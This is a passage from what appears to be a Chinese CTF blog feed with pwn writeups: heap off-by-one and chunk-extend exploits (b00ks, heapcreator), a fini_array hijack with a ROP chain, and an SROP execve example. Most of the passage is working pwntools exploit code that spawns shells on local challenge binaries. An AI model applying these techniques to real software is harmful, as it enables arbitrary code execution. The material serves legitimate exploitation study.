class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./b00ks&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/tr0upe/tools/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#cmd=&#x27;b *$rebase(0x1188)\n&#x27;</span></span><br><span class="line"><span class="comment">#cmd=&#x27;b *$rebase(0xCA6)\n&#x27;</span></span><br><span class="line"><span class="comment">#cmd+=&#x27;b *$rebase(0xCA3)&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(p,cmd)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">creat</span>(<span class="params">size,name,size1,description</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Enter book name size:&#x27;</span>,size)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Enter book name (Max 32 chars):&#x27;</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Enter book description size:&#x27;</span>,size1)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Enter book description:&#x27;</span>,description)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Enter the book id you want to delete:&#x27;</span>,index)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Enter the book id you want to edit: &#x27;</span>,index)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Enter new book description: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printf</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">author</span>(<span class="params">author_name</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Enter author name: &#x27;</span>,author_name)</span><br><span class="line"></span><br><span class="line">author1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Enter author name:&#x27;</span>,author1)</span><br><span class="line"></span><br><span class="line">creat(<span class="string">b&#x27;32&#x27;</span>,<span class="string">&#x27;bbbbb&#x27;</span>,<span class="string">b&#x27;256&#x27;</span>,<span class="string">&#x27;ccccc&#x27;</span>)</span><br><span class="line">creat(<span class="string">b&#x27;135168&#x27;</span>,<span class="string">&#x27;ddddd&#x27;</span>,<span class="string">b&#x27;135168&#x27;</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">printf()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">struct1=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;struct1 =&gt; &#x27;</span>+<span class="built_in">hex</span>(struct1))</span><br><span class="line">struct2=struct1+<span class="number">0x30</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;struct2 =&gt; &#x27;</span>+<span class="built_in">hex</span>(struct2))</span><br><span class="line">name2_addr=struct2+<span class="number">0x8</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;name2_addr =&gt; &#x27;</span>+<span class="built_in">hex</span>(name2_addr))</span><br><span class="line">des2_addr=struct2+<span class="number">0x10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;des2_addr =&gt; &#x27;</span>+<span class="built_in">hex</span>(des2_addr))</span><br><span class="line"></span><br><span class="line">fake_struct=<span class="string">b&#x27;c&#x27;</span>*<span class="number">0xb0</span>+p64(<span class="number">1</span>)+p64(name2_addr)+p64(des2_addr)+p64(<span class="number">0xffff</span>)</span><br><span class="line">edit(<span class="string">b&#x27;1&#x27;</span>,fake_struct)</span><br><span class="line">author(<span class="string">b&#x27;a&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">printf()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Name: &#x27;</span>)</span><br><span class="line">name2_ptr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;name2_ptr =&gt; &#x27;</span>+<span class="built_in">hex</span>(name2_ptr))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Description: &#x27;</span>)</span><br><span class="line">des2_ptr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;des2_ptr =&gt; &#x27;</span>+<span class="built_in">hex</span>(des2_ptr))</span><br><span class="line"></span><br><span class="line">libcbase=name2_ptr-<span class="number">0x5c7010</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libcbase))</span><br><span class="line">free_hook=libcbase+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">exe=libcbase+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">one_gadget=<span class="number">0x4525a</span>+libcbase</span><br><span class="line"></span><br><span class="line">edit(<span class="string">b&#x27;1&#x27;</span>,p64(free_hook))</span><br><span class="line">edit(<span class="string">b&#x27;2&#x27;</span>,p64(one_gadget))</span><br><span class="line"></span><br><span class="line">delete(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="chunk-extend"><a href="#chunk-extend" class="headerlink" title="chunk_extend"></a>chunk_extend</h1><h2 id="基本示例-1：对-inuse-的-fastbin-进行-extend"><a href="#基本示例-1：对-inuse-的-fastbin-进行-extend" class="headerlink" title="基本示例 1：对 inuse 的 fastbin 进行 extend"></a>基本示例 1：对 inuse 的 fastbin 进行 extend</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//分配第一个0x10的chunk</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//分配第二个0x10的chunk</span></span><br><span class="line"></span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span> *)((<span class="type">long</span> <span class="type">long</span>)ptr<span class="number">-0x8</span>)=<span class="number">0x41</span>;<span class="comment">// 修改第一个块的size域</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0x30</span>);<span class="comment">// 实现 extend，控制了第二个块的内容</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="heapcreator"><a href="#heapcreator" class="headerlink" title="heapcreator"></a>heapcreator</h3><p>题目地址:<a href="https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/heap/chunk-extend-shrink/hitcontraning_lab13/heapcreator">heapcreator</a></p><h4 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h4><p><code>prev_size</code>:如果前一个区块是空闲的，则此字段包含前一个块的大小。否则，如果分配了前一个区块，则此字段包含前一个块的用户数据。</p><h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> *(v0 + <span class="number">8</span>) = <span class="built_in">malloc</span>(size);                 <span class="comment">// struct content</span></span><br><span class="line">**(&amp;heaparray + i) = size;                <span class="comment">// struct size</span></span><br></pre></td></tr></table></figure><h4 id="漏洞-1"><a href="#漏洞-1" class="headerlink" title="漏洞"></a>漏洞</h4><p>edit函数可以输入的size大1,存在off_by_one</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read_input(*(*(&amp;heaparray + v1) + <span class="number">1</span>), **(&amp;heaparray + v1) + <span class="number">1LL</span>);</span><br></pre></td></tr></table></figure><h4 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h4><p>修改size域，进行extend，就可以进行任意地址写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./heapcreator&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/tr0upe/tools/glibc-all-in-one/libs/2.23-0ubuntu10_amd64/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">cmd=&#x27;b *0x400A39\n&#x27;</span></span><br><span class="line"><span class="string">cmd+=&#x27;b *0x400B2B\n&#x27;</span></span><br><span class="line"><span class="string">cmd+=&#x27;b *0x400CFB\n&#x27;</span></span><br><span class="line"><span class="string">gdb.attach(p,cmd)</span></span><br><span class="line"><span class="string">pause()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">creat</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Size of Heap : &#x27;</span>,size)</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Content of heap:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,new_content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>,index)</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Content of heap : &#x27;</span>,new_content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">index1</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>,index1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>,index)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_start_main_got=<span class="number">0x602048</span></span><br><span class="line"></span><br><span class="line">creat(<span class="string">b&#x27;24&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>)</span><br><span class="line">creat(<span class="string">b&#x27;16&#x27;</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">16</span>)</span><br><span class="line">edit(<span class="string">b&#x27;0&#x27;</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">24</span>+p8(<span class="number">0x41</span>))</span><br><span class="line">dele(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">creat(<span class="string">b&#x27;48&#x27;</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">40</span>+p64(libc_start_main_got))</span><br><span class="line"></span><br><span class="line">show(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Content : &#x27;</span>)</span><br><span class="line">libcbase=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x20740</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libcbase =&gt; &#x27;</span>+<span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line">free_hook=libcbase+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">exe=libcbase+<span class="number">0x4526a</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;free_hook =&gt; &#x27;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;exe =&gt; &#x27;</span>+<span class="built_in">hex</span>(exe))</span><br><span class="line"></span><br><span class="line">creat(<span class="string">b&#x27;24&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>)</span><br><span class="line">creat(<span class="string">b&#x27;16&#x27;</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">16</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">cmd=&#x27;b *0x400A39\n&#x27;</span></span><br><span class="line"><span class="string">cmd+=&#x27;b *0x400B2B\n&#x27;</span></span><br><span class="line"><span class="string">cmd+=&#x27;b *0x400CFB\n&#x27;</span></span><br><span class="line"><span class="string">gdb.attach(p,cmd)</span></span><br><span class="line"><span class="string">pause()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">edit(<span class="string">b&#x27;2&#x27;</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">24</span>+p8(<span class="number">0x41</span>))</span><br><span class="line">dele(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">creat(<span class="string">b&#x27;48&#x27;</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">32</span>+p64(<span class="number">0x30</span>)+p64(free_hook))</span><br><span class="line">edit(<span class="string">b&#x27;3&#x27;</span>,p64(exe))</span><br><span class="line">dele(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>劫持fini_array</title>
      <link href="/posts/1887/"/>
      <url>/posts/1887/</url>
      
        <content type="html"><![CDATA[<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>程序的入口并不是main,而是libc_start_main,程序运行流程图如下：</p><ul><li>__libc_csu_init</li><li>main</li><li>__libc_csu_fini</li><li>fini_array[1]</li><li>fini_array[0]</li></ul><p>libc_start_main函数原型</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__libc_start_main(main,argc,argv&amp;env,_libc_csu_init,_libc_csu_fini,rtld_fini)</span><br></pre></td></tr></table></figure><p><code>_libc_csu_init</code>,<code>_libc_csu_fini</code>在代码段,可见是函数</p><p>下面是_libc_csu_fini函数的汇编实现,我们来分析一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">push    rbp #将rbp的值压入栈</span><br><span class="line">lea     rax, unk_4B80C0 #将unk_4B80C0的地址(0x4B80C0)放入rax寄存器</span><br><span class="line">lea     rbp, off_4B80B0 #将off_4B80B0的地址(0x4B80B0)放入rbp寄存器</span><br><span class="line"></span><br><span class="line">push    rbx</span><br><span class="line">sub     rax, rbp #rax=rax-rbp=0x10</span><br><span class="line">sub     rsp, 8 </span><br><span class="line">sar     rax, 3 #rax中的值算数右移3位,rax的值为2</span><br><span class="line">jz      short loc_402CE6 #JZ,ZF标志位=1跳转</span><br><span class="line"></span><br><span class="line">lea     rbx, [rax-1] #将rax-1的值即1赋给rbx</span><br><span class="line">nop     dword ptr [rax+00000000h] </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">loc_402CD8:                             </span><br><span class="line">call    qword ptr [rbp+rbx*8+0] #call [rbp+8]</span><br><span class="line"></span><br><span class="line">sub     rbx, 1 #rbx=0</span><br><span class="line">cmp     rbx, 0FFFFFFFFFFFFFFFFh </span><br><span class="line">jnz     short loc_402CD8 #zf不为0,跳转loc_402CD8继续执行call [rbp]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">loc_402CE6:                          </span><br><span class="line">add     rsp, 8</span><br><span class="line">pop     rbx</span><br><span class="line">pop     rbp</span><br><span class="line">jmp     _term_proc</span><br></pre></td></tr></table></figure><p>可以看到,调用fini函数时,会先<code>call fini_array[1]</code>,再<code>call fini_array[0]</code>,所以我们可以修改fini_array中的值来控制程序的执行,例如将<code>fini_array[1]</code>中的值修改为<code>main</code>,<code> fini_array[0]</code>中的值修改为<code>_libc_csu_fini</code>,这样的执行流程如下图所示</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/img/202309101651108.png" alt="fini_array"></p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p><strong>Memory_Monster_II</strong></p><p>IDA逆向,静态编译去符号表</p><p>找到start函数反编译,start函数里有libc_start_main函数,其参数含有<code>main</code>,<code>_libc_csu_init</code>,<code>_libc_csu_fini</code></p><p>有canary,所以我们不能直接溢出</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/img/202309101703301.png" alt="fini_array1"></p><p>如图,箭头所指有任意地址写,我们可以根据上述方法修改fini_array使其无限写,在某一地址布置好rop链后,将fini_array[1]改为<code>ret</code>,fini_array[0]改为<code>leave ret</code>,即可退出循环执行rop链</p><p>这里就有一个问题,<code>leave ret</code>后如何接上rop链,这里我们可以看到fini_array[0]处的指令相当于</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov rsp,rbp </span><br><span class="line">pop rbp</span><br><span class="line">pop rip</span><br></pre></td></tr></table></figure><p>我们只需让rop链的开始填到<code>pop rip</code>的位置,fini_array[0]的地址是<code>0x4B80B0</code>,所以写入的位置应为<code>0x4B80C0</code><br>wp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./Memory_Monster_II&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">fini_array=<span class="number">0x4B80B0</span></span><br><span class="line">main=<span class="number">0x401C1D</span></span><br><span class="line">libc_csu_fini=<span class="number">0x402CB0</span></span><br><span class="line">fini_array_0x10=<span class="number">0x4B80C0</span></span><br><span class="line">pop_rax_ret=<span class="number">0x448fcc</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x401746</span></span><br><span class="line">pop_rsi_ret=<span class="number">0x406f80</span></span><br><span class="line">pop_rdx_ret=<span class="number">0x448415</span></span><br><span class="line">syscall=<span class="number">0x402514</span></span><br><span class="line">leave_ret=<span class="number">0x401cf3</span></span><br><span class="line">binsh=<span class="number">0x4B8108</span></span><br><span class="line">ret=<span class="number">0x401016</span></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">payload1=p64(fini_array)</span><br><span class="line">p.send(payload1)</span><br><span class="line">p.recv()</span><br><span class="line">payload2=p64(libc_csu_fini)+p64(main)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(p64(fini_array_0x10))</span><br><span class="line">p.recv()</span><br><span class="line">p.send(p64(pop_rax_ret)+p64(<span class="number">0x3b</span>))</span><br><span class="line">p.recv()</span><br><span class="line">p.send(p64(fini_array_0x10+<span class="number">0x10</span>))</span><br><span class="line">p.recv()</span><br><span class="line">p.send(p64(pop_rdi_ret)+p64(<span class="number">0x4B8108</span>))</span><br><span class="line">p.recv()</span><br><span class="line">p.send(p64(fini_array_0x10+<span class="number">0x20</span>))</span><br><span class="line">p.recv()</span><br><span class="line">p.send(p64(pop_rsi_ret)+p64(<span class="number">0</span>))</span><br><span class="line">p.recv()</span><br><span class="line">p.send(p64(fini_array_0x10+<span class="number">0x30</span>))</span><br><span class="line">p.recv()</span><br><span class="line">p.send(p64(pop_rdx_ret)+p64(<span class="number">0</span>))</span><br><span class="line">p.recv()</span><br><span class="line">p.send(p64(fini_array_0x10+<span class="number">0x40</span>))</span><br><span class="line">p.recv()</span><br><span class="line">p.send(p64(syscall)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(p64(fini_array))</span><br><span class="line">p.recv()</span><br><span class="line">p.send(p64(leave_ret)+p64(ret))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> stack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>srop</title>
      <link href="/posts/35734/"/>
      <url>/posts/35734/</url>
      
        <content type="html"><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理:"></a>原理:</h2><p>SROP（Sigreturn Oriented Programming），sigreturn是一个系统调用，在 unix 系统发生 signal 的时候会被间接调用<br>当系统进程发起（deliver）一个 signal 的时候，该进程会被短暂的挂起（suspend），进入内核①，然后内核对该进程保留相应的上下文，跳转到之前注册好的 signal handler 中处理 signal②，当 signal 返回后③，内核为进程恢复之前保留的上下文，恢复进程的执行④<br><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/img/202308192253867.png"><br>内核为进程保留相应的上下文的方法主要是：<strong>将所有寄存器压入栈中，以及压入 signal 信息，以及指向 sigreturn 的系统调用地址</strong>，此时栈的情况是这样的：<br><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/img/202308192253891.png"><br>我们<strong>称 ucontext 以及 siginfo 这一段为 signal frame</strong>，需要注意的是这一部分是在用户进程的地址空间，之后会跳转到注册过 signal handler 中处理相应的 signal，因此，当 signal handler 执行完成后就会<strong>执行 sigreturn 系统调用来恢复上下文，主要是将之前压入的寄存器的内容给还原回对应的寄存器</strong>，然后恢复进程的执行</p><p>32 位的 sigreturn 的系统调用号为 77，64 位的系统调用号为 15</p><h2 id="例题思路"><a href="#例题思路" class="headerlink" title="例题思路:"></a>例题思路:</h2><table><thead><tr><th>系统调用</th><th>调用号</th><th>函数原型</th></tr></thead><tbody><tr><td>read</td><td>0</td><td>read(int fd, void *buf, size_t count)</td></tr><tr><td>write</td><td>1</td><td>write(int fd, const void *buf, size_t count)</td></tr><tr><td>sigreturn</td><td>15</td><td>int sigreturn(…)</td></tr><tr><td>execve</td><td>59</td><td>execve(const char *filename, char *const argv[],char *const envp[])</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./ciscn&#x27;</span>)</span><br><span class="line">start_addr=<span class="number">0x4004F1</span></span><br><span class="line">syscall_ret=<span class="number">0x400517</span></span><br><span class="line">rax_ret=<span class="number">0x4004DA</span></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *0x400501&#x27;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">payload=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">16</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(start_addr) <span class="comment">#在栈上写/bin/sh,返回read函数</span></span><br><span class="line">p.send(payload)</span><br><span class="line">stack_addr=u64(p.recv()[<span class="number">32</span>:<span class="number">40</span>])-<span class="number">0x148</span> <span class="comment">#gdb调试,泄露栈地址,-0x148是/bin/sh的地址</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;leak stack addr :&#x27;</span> + <span class="built_in">hex</span>(stack_addr))</span><br><span class="line">execve = SigreturnFrame()</span><br><span class="line">execve.rax = constants.SYS_execve</span><br><span class="line">execve.rdi = stack_addr <span class="comment">#/bin/sh地址,下同</span></span><br><span class="line">execve.rsi = <span class="number">0x0</span> </span><br><span class="line">execve.rdx = <span class="number">0x0</span> </span><br><span class="line">execve.rsp = stack_addr </span><br><span class="line">execve.rip = syscall_ret</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">16</span>+p64(rax_ret)+p64(syscall_ret)+<span class="built_in">bytes</span>(execve) <span class="comment">#rax=15,调用sigreturn,恢复寄存器的值,即调用execve</span></span><br><span class="line">p.send(payload)</span><br><span 